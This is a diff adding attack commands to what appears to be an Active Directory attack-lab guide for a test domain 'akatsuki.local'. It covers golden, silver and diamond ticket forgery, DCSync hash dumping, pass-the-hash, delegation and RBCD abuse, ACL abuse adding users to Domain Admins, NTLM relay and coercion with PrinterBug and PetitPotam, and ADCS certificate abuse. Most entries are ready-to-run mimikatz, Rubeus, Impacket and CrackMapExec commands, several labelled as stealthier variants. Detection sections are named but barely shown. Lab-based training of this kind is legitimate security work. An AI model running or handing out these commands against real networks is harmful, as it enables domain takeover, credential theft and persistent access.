+mimikatz # kerberos::golden /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /krbtgt:KRBTGT_NTHASH /groups:512,519,518,520 /ptt
+
+# With AES256 (stealthier)
+mimikatz # kerberos::golden /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /aes256:KRBTGT_AES256 /ptt
+
+# Save to file instead of injecting
+mimikatz # kerberos::golden /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /krbtgt:KRBTGT_NTHASH /ticket:golden.kirbi
+
+# Inject saved ticket later
+mimikatz # kerberos::ptt golden.kirbi
+```
+
+**Rubeus - Create Golden Ticket**
+```powershell
+# Create and inject
+Rubeus.exe golden /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /rc4:KRBTGT_NTHASH /ptt
+
+# With AES256 (stealthier, avoids RC4 detection)
+Rubeus.exe golden /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /aes256:KRBTGT_AES256 /ptt
+
+# Save to file
+Rubeus.exe golden /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /rc4:KRBTGT_NTHASH /nowrap
+
+# Inject ticket
+Rubeus.exe ptt /ticket:BASE64_TICKET
+```
+
+**Verify ticket is loaded**
+```powershell
+# List current tickets
+klist
+
+# Access DC (should work with any fake username!)
+dir \\dc01.akatsuki.local\C$
 ```
 
 ### Blue Team: Detection
@@ -1119,14 +1494,44 @@ Service Tickets are encrypted with the service account's hash. Forge tickets for
 # Option 3: Compromise the server running the service
 
 # Get computer account hash (for CIFS access to that computer)
-secretsdump.py AKATSUKI/itachi:'Akatsuki123!'@192.168.56.10 -just-dc-user 'WS01$'
+secretsdump.py AKATSUKI/itachi:'Akatsuki123!'@10.10.12.10 -just-dc-user 'WS01$'
 ```
 
 ### Attack Methods
 
+#### 🌐 REMOTE (From Kali/Attack Machine)
+
+```bash
+# Step 1: Get the machine account hash first
+secretsdump.py AKATSUKI/itachi:'Akatsuki123!'@10.10.12.10 -just-dc-user 'WS01$'
+
+# Step 2: Forge Silver Ticket for CIFS using ticketer.py
+ticketer.py -nthash MACHINE_NTLM_HASH -domain-sid S-1-5-21-XXXXXXX -domain akatsuki.local -spn cifs/ws01.akatsuki.local fakeadmin
+
+# Step 3: Export ticket and use it
+export KRB5CCNAME=fakeadmin.ccache
+smbclient.py -k -no-pass ws01.akatsuki.local
+
+# Silver Ticket for other services
+ticketer.py -nthash HASH -domain-sid S-1-5-21-XXXXXXX -domain akatsuki.local -spn http/ws01.akatsuki.local fakeadmin
+ticketer.py -nthash HASH -domain-sid S-1-5-21-XXXXXXX -domain akatsuki.local -spn wsman/ws01.akatsuki.local fakeadmin
+ticketer.py -nthash HASH -domain-sid S-1-5-21-XXXXXXX -domain akatsuki.local -spn mssql/dc01.akatsuki.local fakeadmin
+```
+
+#### 💻 LOCAL (From Compromised Host)
+
 ```powershell
-# Silver Ticket for CIFS (file shares)
+# Mimikatz - Silver Ticket for CIFS (file shares)
 mimikatz # kerberos::golden /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /target:ws01.akatsuki.local /service:cifs /rc4:MACHINE_HASH /ptt
+
+# Mimikatz - Silver Ticket for HTTP
+mimikatz # kerberos::golden /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /target:ws01.akatsuki.local /service:http /rc4:MACHINE_HASH /ptt
+
+# Mimikatz - Silver Ticket for WinRM (wsman)
+mimikatz # kerberos::golden /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /target:ws01.akatsuki.local /service:wsman /rc4:MACHINE_HASH /ptt
+
+# Rubeus - Forge Silver Ticket
+Rubeus.exe silver /service:cifs/ws01.akatsuki.local /rc4:MACHINE_HASH /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /ptt
 
 # Common services: cifs, http, mssql, wsman, ldap, host
 ```
@@ -1147,8 +1552,48 @@ Diamond Ticket modifies a **legitimate TGT** rather than forging a new one. More
 
 ### Attack Methods
 
+#### 🌐 REMOTE (From Kali/Attack Machine)
+
+```bash
+# Diamond Ticket requires modifying a legitimate TGT
+# This is primarily a LOCAL attack, but you can:
+
+# Step 1: First get the krbtgt AES key via DCSync
+secretsdump.py AKATSUKI/itachi:'Akatsuki123!'@10.10.12.10 -just-dc-user krbtgt
+
+# Step 2: Get a valid TGT for a low-priv user
+getTGT.py akatsuki.local/orochimaru:'Snake2024!' -dc-ip 10.10.12.10
+
+# Step 3: Modify the TGT offline (requires custom tooling)
+# Note: Impacket doesn't have native diamond ticket support
+# You would need to:
+#   - Extract the TGT from .ccache
+#   - Decrypt with krbtgt key
+#   - Modify PAC (add admin groups)
+#   - Re-encrypt and use
+
+# Alternative: Use ticketer.py to forge a Golden Ticket that mimics Diamond Ticket
+# behavior by copying a real user's ticket structure
+ticketer.py -aesKey KRBTGT_AES_KEY -domain-sid S-1-5-21-XXXXXXX -domain akatsuki.local -user-id 500 -groups 512 administrator
+```
+
+#### 💻 LOCAL (From Compromised Host) - Primary Method
+
 ```powershell
+# Rubeus Diamond Ticket - This is the main way to create Diamond Tickets
+# Requires krbtgt AES key (from DCSync or NTDS.dit extraction)
+
+# Basic Diamond Ticket - request TGT as low-priv user, modify to high-priv
 Rubeus.exe diamond /krbkey:AES256_KRBTGT_KEY /user:lowprivuser /enctype:aes /ticketuser:administrator /ticketuserid:500 /groups:512 /ptt
+
+# With specific password for low-priv user
+Rubeus.exe diamond /krbkey:AES256_KRBTGT_KEY /user:orochimaru /password:Snake2024! /enctype:aes /ticketuser:administrator /ticketuserid:500 /groups:512 /ptt
+
+# With DC specified
+Rubeus.exe diamond /krbkey:AES256_KRBTGT_KEY /user:orochimaru /password:Snake2024! /enctype:aes /ticketuser:administrator /ticketuserid:500 /groups:512 /dc:dc01.akatsuki.local /ptt
+
+# Output to file instead of injecting
+Rubeus.exe diamond /krbkey:AES256_KRBTGT_KEY /user:lowprivuser /enctype:aes /ticketuser:administrator /ticketuserid:500 /groups:512 /outfile:diamond.kirbi
 ```
 
 ### Detection
@@ -1193,7 +1638,7 @@ Client                          Server
 # Option 3: DCSync (see section 2.3)
 
 # For testing, dump itachi's hash from DC:
-secretsdump.py AKATSUKI/itachi:'Akatsuki123!'@192.168.56.10 -just-dc-user itachi
+secretsdump.py AKATSUKI/itachi:'Akatsuki123!'@10.10.12.10 -just-dc-user itachi
 ```
 
 **Step 2: Ensure NTLM is enabled (default)**
@@ -1207,39 +1652,97 @@ Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCom
 
 ### Attack Methods
 
-**Method 1: Impacket**
+#### 🌐 REMOTE (From Kali - using NTLM hash directly)
+
+**Impacket Suite - Various execution methods**
 ```bash
-# psexec (creates service, noisy)
-psexec.py -hashes :NTHASH AKATSUKI/itachi@192.168.56.11
+# psexec.py (creates service - most reliable but noisy)
+psexec.py -hashes :NTHASH AKATSUKI/itachi@10.10.12.21
 
-# wmiexec (uses WMI, stealthier)
-wmiexec.py -hashes :NTHASH AKATSUKI/itachi@192.168.56.11
+# wmiexec.py (uses WMI - stealthier, no service)
+wmiexec.py -hashes :NTHASH AKATSUKI/itachi@10.10.12.21
 
-# smbexec (uses SMB)
-smbexec.py -hashes :NTHASH AKATSUKI/itachi@192.168.56.11
+# smbexec.py (uses SMB named pipe)
+smbexec.py -hashes :NTHASH AKATSUKI/itachi@10.10.12.21
 
-# atexec (uses Task Scheduler)
-atexec.py -hashes :NTHASH AKATSUKI/itachi@192.168.56.11 "whoami"
+# atexec.py (uses Task Scheduler - stealthier)
+atexec.py -hashes :NTHASH AKATSUKI/itachi@10.10.12.21 "whoami"
+
+# dcomexec.py (uses DCOM - very stealthy)
+dcomexec.py -hashes :NTHASH AKATSUKI/itachi@10.10.12.21
 ```
 
-**Method 2: Mimikatz**
+**CrackMapExec - Mass PtH**
+```bash
+# Execute commands on single host
+crackmapexec smb 10.10.12.21 -u itachi -H NTHASH -x "whoami"
+
+# Execute commands on multiple hosts
+crackmapexec smb 10.10.12.0/24 -u itachi -H NTHASH -x "whoami"
+
+# Just check access (no execution)
+crackmapexec smb 10.10.12.0/24 -u itachi -H NTHASH
+
+# Get shell via various methods
+crackmapexec smb 10.10.12.21 -u itachi -H NTHASH --exec-method wmiexec -x "whoami"
+crackmapexec smb 10.10.12.21 -u itachi -H NTHASH --exec-method atexec -x "whoami"
+```
+
+**Evil-WinRM - Interactive shell via WinRM**
+```bash
+# WinRM PtH (port 5985)
+evil-winrm -i 10.10.12.21 -u itachi -H NTHASH
+
+# With SSL (port 5986)
+evil-winrm -i 10.10.12.21 -u itachi -H NTHASH -S
+```
+
+**xfreerdp - RDP with hash (Restricted Admin mode)**
+```bash
+# RDP Pass-the-Hash (requires Restricted Admin enabled on target)
+xfreerdp /v:10.10.12.21 /u:itachi /pth:NTHASH /d:AKATSUKI
+```
+
+**smbclient - Access file shares**
+```bash
+# Access shares with hash
+smbclient //10.10.12.21/C$ -U AKATSUKI/itachi --pw-nt-hash NTHASH
+smbclient //10.10.12.21/ADMIN$ -U AKATSUKI/itachi --pw-nt-hash NTHASH
+```
+
+#### 💻 LOCAL (With Shell - spawn new process with hash)
+
+**Mimikatz - Spawn process with different creds**
 ```powershell
-# Spawn new process with hash
-mimikatz # sekurlsa::pth /user:itachi /domain:AKATSUKI /ntlm:HASH /run:cmd.exe
+# Pass-the-Hash - spawn cmd with itachi's context
+mimikatz # sekurlsa::pth /user:itachi /domain:AKATSUKI /ntlm:NTHASH /run:cmd.exe
+
+# Spawn PowerShell
+mimikatz # sekurlsa::pth /user:itachi /domain:AKATSUKI /ntlm:NTHASH /run:powershell.exe
+
+# With AES key (stealthier)
+mimikatz # sekurlsa::pth /user:itachi /domain:AKATSUKI /aes256:AESKEY /run:cmd.exe
 ```
 
-**Method 3: CrackMapExec**
-```bash
-# Execute commands
-crackmapexec smb 192.168.56.11 -u itachi -H HASH -x "whoami"
-
-# Spray against multiple hosts
-crackmapexec smb targets.txt -u itachi -H HASH
+**Invoke-Mimikatz - PowerShell**
+```powershell
+# PtH via PowerShell
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:itachi /domain:AKATSUKI /ntlm:NTHASH /run:cmd.exe"'
 ```
 
-**Method 4: Evil-WinRM**
-```bash
-evil-winrm -i 192.168.56.11 -u itachi -H HASH
+**Rubeus - Overpass-the-Hash (get TGT from hash)**
+```powershell
+# Request TGT with hash (then use for Kerberos auth)
+Rubeus.exe asktgt /user:itachi /rc4:NTHASH /ptt
+
+# With AES
+Rubeus.exe asktgt /user:itachi /aes256:AESKEY /ptt
+```
+
+**SharpKatz**
+```powershell
+# PtH via SharpKatz
+SharpKatz.exe --Command pth --User itachi --Domain AKATSUKI --NtlmHash NTHASH
 ```
 
 ### Blue Team: Detection
@@ -1281,6 +1784,27 @@ Rubeus.exe dump /service:krbtgt /nowrap
 
 ### Attack Methods
 
+#### 🌐 REMOTE (From Kali - using .ccache tickets)
+
+```bash
+# Convert .kirbi to .ccache for Linux use
+ticketConverter.py ticket.kirbi ticket.ccache
+
+# Export ticket
+export KRB5CCNAME=ticket.ccache
+
+# Use with any Impacket tool
+psexec.py -k -no-pass AKATSUKI/itachi@dc01.akatsuki.local
+wmiexec.py -k -no-pass AKATSUKI/itachi@ws01.akatsuki.local
+smbclient.py -k -no-pass dc01.akatsuki.local
+
+# CrackMapExec with ticket
+export KRB5CCNAME=ticket.ccache
+crackmapexec smb dc01.akatsuki.local -k --shares
+```
+
+#### 💻 LOCAL (With Shell on Windows)
+
 ```powershell
 # Import ticket (Mimikatz)
 mimikatz # kerberos::ptt ticket.kirbi
@@ -1288,8 +1812,14 @@ mimikatz # kerberos::ptt ticket.kirbi
 # Import ticket (Rubeus)
 Rubeus.exe ptt /ticket:base64_ticket
 
-# Verify
+# Import from file
+Rubeus.exe ptt /ticket:C:\temp\ticket.kirbi
+
+# Verify ticket is loaded
 klist
+
+# Now access resources
+dir \\dc01.akatsuki.local\C$
 ```
 
 ---
@@ -1302,13 +1832,38 @@ Use an NTLM hash to request a Kerberos ticket. Combines PtH + Kerberos.
 
 ### Attack Methods
 
+#### 🌐 REMOTE (From Kali - request TGT with hash)
+
+```bash
+# Request TGT using hash (saves as .ccache)
+getTGT.py -hashes :NTHASH AKATSUKI/itachi -dc-ip 10.10.12.10
+
+# With AES key (stealthier)
+getTGT.py -aesKey AES256KEY AKATSUKI/itachi -dc-ip 10.10.12.10
+
+# Export and use
+export KRB5CCNAME=itachi.ccache
+
+# Now use Kerberos auth instead of NTLM
+psexec.py -k -no-pass AKATSUKI/itachi@dc01.akatsuki.local
+wmiexec.py -k -no-pass AKATSUKI/itachi@ws01.akatsuki.local
+```
+
+#### 💻 LOCAL (With Shell on Windows)
+
 ```powershell
 # Mimikatz - spawn process with Kerberos auth
 mimikatz # sekurlsa::pth /user:itachi /domain:AKATSUKI /ntlm:HASH /run:powershell.exe
 
-# Rubeus - request TGT
+# Rubeus - request TGT and inject
 Rubeus.exe asktgt /user:itachi /rc4:HASH /ptt
 Rubeus.exe asktgt /user:itachi /aes256:AESHASH /ptt   # Stealthier
+
+# With domain specified
+Rubeus.exe asktgt /user:itachi /domain:akatsuki.local /rc4:HASH /dc:dc01.akatsuki.local /ptt
+
+# Verify
+klist
 ```
 
 ---
@@ -1331,10 +1886,10 @@ Rubeus.exe asktgt /user:itachi /aes256:AESHASH /ptt   # Stealthier
 
 ```bash
 # DCOM
-dcomexec.py AKATSUKI/itachi:'Akatsuki123!'@192.168.56.11
+dcomexec.py AKATSUKI/itachi:'Akatsuki123!'@10.10.12.11
 
 # WinRM
-evil-winrm -i 192.168.56.11 -u itachi -p 'Akatsuki123!'
+evil-winrm -i 10.10.12.11 -u itachi -p 'Akatsuki123!'
 ```
 
 ```powershell
@@ -1376,6 +1931,45 @@ Write-Host "WS01 now has Unconstrained Delegation - TGTs will be cached" -Foregr
 
 ### Attack Methods
 
+#### 🌐 REMOTE (From Kali)
+
+**Step 1: Find unconstrained delegation machines**
+```bash
+# Using ldapsearch
+ldapsearch -x -H ldap://10.10.12.10 -D "orochimaru@akatsuki.local" -w 'Snake2024!' -b "DC=akatsuki,DC=local" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn
+
+# Using CrackMapExec
+crackmapexec ldap 10.10.12.10 -u orochimaru -p 'Snake2024!' -M find-delegation
+
+# Using bloodhound-python
+bloodhound-python -u orochimaru -p 'Snake2024!' -d akatsuki.local -ns 10.10.12.10 -c All
+# Then query in BloodHound for unconstrained delegation
+```
+
+**Step 2: Coerce DC to authenticate to compromised machine**
+```bash
+# PrinterBug - forces DC to authenticate to WS01
+python3 printerbug.py AKATSUKI/orochimaru:'Snake2024!'@10.10.12.10 10.10.12.21
+
+# PetitPotam - EFS coercion (may work without creds!)
+python3 PetitPotam.py 10.10.12.21 10.10.12.10
+
+# Coercer - tries multiple coercion methods
+python3 coercer.py -u orochimaru -p 'Snake2024!' -d akatsuki.local -l 10.10.12.21 -t 10.10.12.10
+```
+
+**Step 3: Use captured TGT from Linux**
+```bash
+# Convert captured .kirbi to .ccache
+ticketConverter.py dc01_tgt.kirbi dc01.ccache
+
+# Export and use
+export KRB5CCNAME=dc01.ccache
+secretsdump.py -k -no-pass akatsuki.local/DC01\$@dc01.akatsuki.local
+```
+
+#### 💻 LOCAL (With Admin Shell on Unconstrained Delegation Machine)
+
 **Step 1: Find unconstrained delegation machines**
 ```powershell
 # PowerView
@@ -1385,24 +1979,32 @@ Get-DomainComputer -Unconstrained
 Get-ADComputer -Filter {TrustedForDelegation -eq $true}
 ```
 
-**Step 2: Compromise the machine and extract TGTs**
+**Step 2: Monitor for incoming TGTs**
 ```powershell
-# On WS01 (requires local admin)
+# Rubeus - monitor and capture TGTs
+Rubeus.exe monitor /interval:5 /nowrap
+
+# Or export all current tickets
 mimikatz # sekurlsa::tickets /export
 ```
 
-**Step 3: Force high-value target to connect (Coercion)**
+**Step 3: Force high-value target to connect (from another shell)**
 ```bash
-# PrinterBug - forces DC to authenticate to WS01
-python3 printerbug.py AKATSUKI/orochimaru:'Snake2024!'@192.168.56.10 192.168.56.11
-
-# PetitPotam - EFS coercion
-python3 PetitPotam.py 192.168.56.11 192.168.56.10
+# From Kali - PrinterBug
+python3 printerbug.py AKATSUKI/orochimaru:'Snake2024!'@10.10.12.10 10.10.12.21
 ```
 
-**Step 4: Capture and use TGT**
+**Step 4: Use captured TGT**
 ```powershell
-mimikatz # kerberos::ptt captured_tgt.kirbi
+# Import captured TGT
+mimikatz # kerberos::ptt [0;xxxxx]-2-1-xxxxxxxx-DC01$@krbtgt-AKATSUKI.LOCAL.kirbi
+
+# Or with Rubeus
+Rubeus.exe ptt /ticket:BASE64_TGT
+
+# Verify and use
+klist
+dir \\dc01.akatsuki.local\c$
 ```
 
 ### Blue Team: Detection & Prevention
@@ -1452,12 +2054,58 @@ Write-Host "svc_web can now delegate to CIFS on DC01" -ForegroundColor Yellow
 
 ### Attack Methods
 
-```powershell
-# Find constrained delegation
-Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties msDS-AllowedToDelegateTo
+#### 🌐 REMOTE (From Kali - using S4U)
 
-# Abuse with Rubeus (need svc_web hash)
+**Step 1: Find constrained delegation**
+```bash
+# Using ldapsearch
+ldapsearch -x -H ldap://10.10.12.10 -D "orochimaru@akatsuki.local" -w 'Snake2024!' -b "DC=akatsuki,DC=local" "(msDS-AllowedToDelegateTo=*)" cn msDS-AllowedToDelegateTo
+
+# Using CrackMapExec
+crackmapexec ldap 10.10.12.10 -u orochimaru -p 'Snake2024!' -M find-delegation
+```
+
+**Step 2: Abuse with Impacket getST.py (S4U2Self + S4U2Proxy)**
+```bash
+# Get service ticket as administrator for CIFS on DC
+getST.py -spn cifs/dc01.akatsuki.local -impersonate administrator AKATSUKI/svc_web:'WebServicePass!' -dc-ip 10.10.12.10
+
+# With hash instead of password
+getST.py -spn cifs/dc01.akatsuki.local -impersonate administrator -hashes :NTHASH AKATSUKI/svc_web -dc-ip 10.10.12.10
+
+# Export and use
+export KRB5CCNAME=administrator.ccache
+smbclient.py -k -no-pass dc01.akatsuki.local
+secretsdump.py -k -no-pass akatsuki.local/administrator@dc01.akatsuki.local
+```
+
+#### 💻 LOCAL (With Shell on Domain-Joined Machine)
+
+**Step 1: Find constrained delegation**
+```powershell
+# PowerView
+Get-DomainUser -TrustedToAuth | Select samaccountname, msds-allowedtodelegateto
+Get-DomainComputer -TrustedToAuth | Select cn, msds-allowedtodelegateto
+
+# AD Module
+Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties msDS-AllowedToDelegateTo
+Get-ADComputer -Filter {TrustedToAuthForDelegation -eq $true} -Properties msDS-AllowedToDelegateTo
+```
+
+**Step 2: Abuse with Rubeus (need svc_web hash)**
+```powershell
+# S4U to get admin ticket for CIFS on DC
 Rubeus.exe s4u /user:svc_web /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/dc01.akatsuki.local /ptt
+
+# With AES key
+Rubeus.exe s4u /user:svc_web /aes256:AESKEY /impersonateuser:administrator /msdsspn:cifs/dc01.akatsuki.local /ptt
+
+# Alternative SPN (can change service!)
+Rubeus.exe s4u /user:svc_web /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/dc01.akatsuki.local /altservice:ldap /ptt
+
+# Verify and use
+klist
+dir \\dc01.akatsuki.local\c$
 ```
 
 ### Cleanup: Remove Vulnerability
@@ -1502,17 +2150,73 @@ Write-Host "orochimaru can now write to WS02 computer object - RBCD vulnerable" 
 
 ### Attack Methods
 
+#### 🌐 REMOTE (From Kali - Full RBCD chain)
+
+**Step 1: Create machine account**
+```bash
+# Using Impacket addcomputer.py
+addcomputer.py -computer-name 'YOURPC$' -computer-pass 'Password123!' -dc-ip 10.10.12.10 AKATSUKI/orochimaru:'Snake2024!'
+
+# Check MachineAccountQuota first
+crackmapexec ldap 10.10.12.10 -u orochimaru -p 'Snake2024!' -M MAQ
+```
+
+**Step 2: Set RBCD attribute (if you have write access)**
+```bash
+# Using rbcd.py from Impacket
+rbcd.py -delegate-to 'WS02$' -delegate-from 'YOURPC$' -dc-ip 10.10.12.10 -action write AKATSUKI/orochimaru:'Snake2024!'
+
+# Or using ntlmrelayx (during relay attack)
+ntlmrelayx.py -t ldap://10.10.12.10 --delegate-access --escalate-user YOURPC$
+```
+
+**Step 3: S4U attack to get admin ticket**
+```bash
+# Get ticket as administrator for CIFS on WS02
+getST.py -spn cifs/ws02.akatsuki.local -impersonate administrator AKATSUKI/'YOURPC$':'Password123!' -dc-ip 10.10.12.10
+
+# Export and use
+export KRB5CCNAME=administrator.ccache
+smbclient.py -k -no-pass ws02.akatsuki.local
+wmiexec.py -k -no-pass akatsuki.local/administrator@ws02.akatsuki.local
+```
+
+#### 💻 LOCAL (With Shell on Domain-Joined Machine)
+
+**Step 1: Create a machine account (if MachineAccountQuota > 0)**
 ```powershell
-# 1. Create a machine account (if MachineAccountQuota > 0)
+# Using PowerMad
+Import-Module .\Powermad.ps1
 New-MachineAccount -MachineAccount YOURPC -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
 
-# 2. Set RBCD - allow YOURPC to delegate to WS02
+# Get the new machine account SID
+$sid = Get-DomainComputer YOURPC -Properties objectsid | Select -Expand objectsid
+```
+
+**Step 2: Set RBCD - allow YOURPC to delegate to WS02**
+```powershell
+# Using PowerView / AD module
 Set-ADComputer WS02 -PrincipalsAllowedToDelegateToAccount YOURPC$
 
-# 3. Use S4U to get admin ticket
+# Or using raw descriptor
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+Set-DomainObject WS02 -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+```
+
+**Step 3: Get machine account hash**
+```powershell
+# Calculate NTLM hash from password
+Rubeus.exe hash /password:Password123!
+```
+
+**Step 4: Use S4U to get admin ticket**
+```powershell
 Rubeus.exe s4u /user:YOURPC$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/ws02.akatsuki.local /ptt
 
-# 4. Access target
+# Verify and access
+klist
 ls \\ws02\c$
 ```
 
@@ -1571,9 +2275,27 @@ Write-Host "orochimaru now has GenericAll on deidara - can reset password or set
 
 ## Finding Abusable ACLs
 
+#### 🌐 REMOTE (From Kali)
+
+```bash
+# Using bloodhound-python to collect ACL data
+bloodhound-python -u orochimaru -p 'Snake2024!' -d akatsuki.local -ns 10.10.12.10 -c ACL
+
+# Using ldapsearch for specific ACL queries
+ldapsearch -x -H ldap://10.10.12.10 -D "orochimaru@akatsuki.local" -w 'Snake2024!' -b "DC=akatsuki,DC=local" "(objectClass=user)" nTSecurityDescriptor
+
+# Using dacledit.py (Impacket) - view ACLs
+dacledit.py -action read -target 'deidara' -principal 'orochimaru' AKATSUKI/orochimaru:'Snake2024!' -dc-ip 10.10.12.10
+```
+
+#### 💻 LOCAL (With Shell on Domain-Joined Machine)
+
 ```powershell
 # PowerView - Find interesting ACLs
 Find-InterestingDomainAcl -ResolveGUIDs
+
+# Check specific user ACLs
+Get-DomainObjectAcl -Identity deidara -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner"}
 
 # BloodHound - Best visualization
 .\SharpHound.exe -c All
@@ -1582,9 +2304,36 @@ Find-InterestingDomainAcl -ResolveGUIDs
 
 ## Exploitation Examples
 
+#### 🌐 REMOTE (From Kali)
+
+```bash
+# GenericAll on User - Reset password remotely
+# Using Impacket's net.py or rpcclient
+net rpc password deidara 'NewPass123!' -U 'akatsuki.local/orochimaru%Snake2024!' -S 10.10.12.10
+
+# GenericAll on User - Set SPN for Kerberoasting (using dacledit)
+# First add SPN, then Kerberoast
+addspn.py -u 'akatsuki.local\orochimaru' -p 'Snake2024!' -t 'deidara' -s 'fake/spn' -dc-ip 10.10.12.10
+
+# Then Kerberoast
+GetUserSPNs.py AKATSUKI/orochimaru:'Snake2024!' -dc-ip 10.10.12.10 -request
+
+# AddMember - Add user to group (using net.py)
+net rpc group addmem "Domain Admins" orochimaru -U 'akatsuki.local/orochimaru%Snake2024!' -S 10.10.12.10
+
+# Using bloodyAD (great for ACL abuse)
+bloodyAD -u orochimaru -p 'Snake2024!' -d akatsuki.local --host 10.10.12.10 set password deidara 'NewPass123!'
+bloodyAD -u orochimaru -p 'Snake2024!' -d akatsuki.local --host 10.10.12.10 add groupMember "Domain Admins" orochimaru
+```
+
+#### 💻 LOCAL (With Shell on Domain-Joined Machine)
+
 ```powershell
 # GenericAll on User - Reset password
 Set-DomainUserPassword -Identity deidara -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
+
+# Alternative using AD module
+Set-ADAccountPassword -Identity deidara -Reset -NewPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
 
 # GenericAll on User - Set SPN for Kerberoasting
 Set-DomainObject -Identity deidara -Set @{serviceprincipalname='fake/spn'}
@@ -1592,8 +2341,15 @@ Set-DomainObject -Identity deidara -Set @{serviceprincipalname='fake/spn'}
 # WriteDACL - Grant yourself GenericAll
 Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity orochimaru -Rights All
 
+# WriteOwner - Take ownership then modify
+Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity orochimaru
+Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity orochimaru -Rights All
+
 # AddMember on Group
 Add-DomainGroupMember -Identity "Domain Admins" -Members orochimaru
+
+# Using AD module
+Add-ADGroupMember -Identity "Domain Admins" -Members orochimaru
 ```
 
 ---
@@ -1630,18 +2386,79 @@ Write-Host "SMB Signing disabled on this machine - vulnerable to relay" -Foregro
 
 ## Attack Methods
 
-```bash
-# 1. Check signing requirements
-crackmapexec smb 192.168.56.0/24 --gen-relay-list targets.txt
+#### 🌐 REMOTE (From Kali - This is primarily a remote attack)
 
-# 2. Start Responder (disable SMB/HTTP)
+**Step 1: Find relay targets (machines without signing)**
+```bash
+# CrackMapExec - check SMB signing
+crackmapexec smb 10.10.12.0/24 --gen-relay-list targets.txt
+
+# NetExec version
+netexec smb 10.10.12.0/24 --gen-relay-list targets.txt
+
+# Nmap script
+nmap --script smb2-security-mode -p 445 10.10.12.0/24
+```
+
+**Step 2: Start Responder to capture auth (poison LLMNR/NBNS/mDNS)**
+```bash
+# Edit /etc/responder/Responder.conf - set SMB = Off, HTTP = Off
 sudo responder -I eth0 -r -d -w
 
-# 3. Start relay
+# Or use Responder in analyze mode
+sudo responder -I eth0 -A
+```
+
+**Step 3: Start ntlmrelayx**
+```bash
+# Basic relay to SMB
+ntlmrelayx.py -tf targets.txt -smb2support
+
+# Relay with SOCKS proxy (maintain sessions)
 ntlmrelayx.py -tf targets.txt -smb2support -socks
 
-# 4. Use relayed sessions
-proxychains secretsdump.py -no-pass DOMAIN/relayed_user@target
+# Relay to LDAP for shadow credentials or RBCD
+ntlmrelayx.py -t ldap://10.10.12.10 --shadow-credentials
+ntlmrelayx.py -t ldap://10.10.12.10 --delegate-access --escalate-user YOURPC$
+
+# Relay and execute command
+ntlmrelayx.py -tf targets.txt -smb2support -c "whoami > C:\temp\pwned.txt"
+
+# Relay and dump SAM
+ntlmrelayx.py -tf targets.txt -smb2support --sam
+```
+
+**Step 4: Trigger authentication (if needed)**
+```bash
+# PrinterBug
+python3 printerbug.py AKATSUKI/orochimaru:'Snake2024!'@10.10.12.10 KALI_IP
+
+# PetitPotam (unauthenticated on unpatched DCs!)
+python3 PetitPotam.py KALI_IP 10.10.12.10
+
+# Coercer - tries all methods
+python3 coercer.py -u orochimaru -p 'Snake2024!' -d akatsuki.local -l KALI_IP -t 10.10.12.10
+```
+
+**Step 5: Use relayed sessions**
+```bash
+# With SOCKS proxy enabled
+proxychains secretsdump.py -no-pass AKATSUKI/relayed_user@10.10.12.21
+proxychains smbclient.py -no-pass AKATSUKI/relayed_user@10.10.12.21
+```
+
+#### 💻 LOCAL (From Compromised Host - Forward auth)
+
+```powershell
+# Use Inveigh (PowerShell Responder)
+Import-Module .\Inveigh.ps1
+Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+
+# Or use InveighZero (C# version)
+.\InveighZero.exe
+
+# Forward captured hashes to attacker's ntlmrelayx
+# From compromised host, you can also use portbender/socat to redirect traffic
 ```
 
 ## Blue Team: Prevention
@@ -1773,13 +2590,13 @@ Install-AdcsCertificationAuthority -CAType EnterpriseRootCa -Force
 
 ```bash
 # Find vulnerable templates
-certipy find -u orochimaru@akatsuki.local -p 'Snake2024!' -dc-ip 192.168.56.10
+certipy find -u orochimaru@akatsuki.local -p 'Snake2024!' -dc-ip 10.10.12.10
 
 # ESC1 - Request cert as Administrator
 certipy req -u orochimaru@akatsuki.local -p 'Snake2024!' -ca AKATSUKI-DC01-CA -template VulnTemplate -upn administrator@akatsuki.local
 
 # Authenticate with certificate
-certipy auth -pfx administrator.pfx -dc-ip 192.168.56.10
+certipy auth -pfx administrator.pfx -dc-ip 10.10.12.10
 ```
 
 ## Blue Team: Prevention
